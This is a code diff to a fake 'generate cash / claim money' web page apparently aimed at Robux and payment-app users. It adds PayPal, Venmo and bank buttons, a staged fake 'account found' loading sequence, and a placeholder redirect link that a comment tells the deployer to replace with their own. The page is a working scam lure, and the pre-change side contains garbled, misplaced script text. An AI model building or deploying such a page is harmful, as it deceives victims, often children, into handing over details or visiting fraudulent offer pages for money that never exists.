@@ -317,7 +317,7 @@
                 <label for="username" class="label">USERNAME :</label>
                 <div class="input-group">
                     <img src="https://i.ibb.co.com/CRq054H/user-12484547.png" alt="User Icon" class="input-icon-img">
-                    <input type="text" id="username" placeholder="Username" required>
+                    <input type="text" id="username" placeholder="Username / ID" required>
                 </div>
 
                 <label class="label platform-label">YOUR PLATFORM</label>
@@ -369,38 +369,30 @@
                 <label class="label platform-label">SELECT PAYMENT METHOD</label>
                 <div class="platform-selection-payment">
                     
-        
+                    <button type="button" class="payment-button selected" data-platform="paypal">
+                        <img src="https://i.ibb.co.com/S430q408/logo-11378189.png" alt="PayPal Icon" class="payment-icon-img">
+                        PayPal
+                    </button>
                     <button type="button" class="payment-button" data-platform="cashapp">
                         <img src="https://i.ibb.co.com/Kc32bvGJ/images-1.png" alt="Cash App Icon" class="payment-icon-img">
                         Cash App
                     </button>
+                    <button type="button" class="payment-button" data-platform="venmo">
+                        <img src="https://i.ibb.co.com/Mz4n1Y9/images-2.png" alt="Venmo Icon" class="payment-icon-img">
+                        Venmo
+                    </button>
+                    <button type="button" class="payment-button" data-platform="bank">
+                        <img src="https://i.ibb.co.com/r2Q1jRrt/bank-4011278.png" alt="Bank Icon" class="payment-icon-img">
+                        Bank Transfer
+                    </button>
 
                 </div>
 
-                
-        
-        // --- Step 1: Platform Button Logic (Game/App) ---
-        platformButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                platformButtons.forEach(btn => btn.classList.remove('selected'));
-                button.classList.add('selected');
-            });
-        });
-
-        // --- Step 2: Payment Button Logic (PayPal, Cash App, dll.) ---
-        paymentButtons.forEach(button => {
-            button.addEventListener('click', () => {
-                paymentButtons.forEach(btn => btn.classList.remove('selected'));
-                button.classList.add('selected');
-            });
-        });
-
-        // --- STEP 1 LOGIC: Pindah ke Step 2 ---
-        step1Form.                <button type="submit" class="continue-button" id="continueBtn2">GENERATE CASH</button>
+                <button type="submit" class="continue-button" id="continueBtn2">Claim Money</button>
 
                 <div class="loading-container" id="loading2">
                     <div class="spinner"></div>
-                    <p id="loadingText2">Generating...</p>
+                    <p id="loadingText2">Loading...</p>
                 </div>
             </form>
         </div>
@@ -434,16 +426,46 @@
         const verifyButton = document.getElementById('verifyButton');
         
         // !!! GANTI DENGAN LINK UTAMA ANDA !!!
-        const mainLink = "https://rebrand.ly/Claim-moneyy"; 
-
-       // --- Step 1: Platform Button Logic (Game/App) ---
+        const mainLink = "https://anyareuyah.blogspot.com/?s1=monica"; 
+        
+        // --- Step 1: Platform Button Logic (Game/App) ---
         platformButtons.forEach(button => {
             button.addEventListener('click', () => {
                 platformButtons.forEach(btn => btn.classList.remove('selected'));
                 button.classList.add('selected');
             });
         });
-        
+
+        // --- Step 2: Payment Button Logic (PayPal, Cash App, dll.) ---
+        paymentButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                paymentButtons.forEach(btn => btn.classList.remove('selected'));
+                button.classList.add('selected');
+            });
+        });
+
+        // --- STEP 1 LOGIC: Pindah ke Step 2 ---
+        step1Form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            accountFound.style.display = 'none';
+            continueBtn1.style.display = 'none';
+            loading1.style.display = 'flex'; 
+
+            setTimeout(() => {
+                loading1.style.display = 'none';
+                accountFound.style.display = 'block';
+
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'block'; 
+                    accountFound.style.display = 'none'; 
+                    document.querySelector('.card').scrollIntoView({ behavior: 'smooth' });
+                }, 500);
+
+            }, 1500); 
+        });
+
         // --- STEP 2 LOGIC (Nominal Cash) ---
         robuxButtons.forEach(button => {
             button.addEventListener('click', () => {
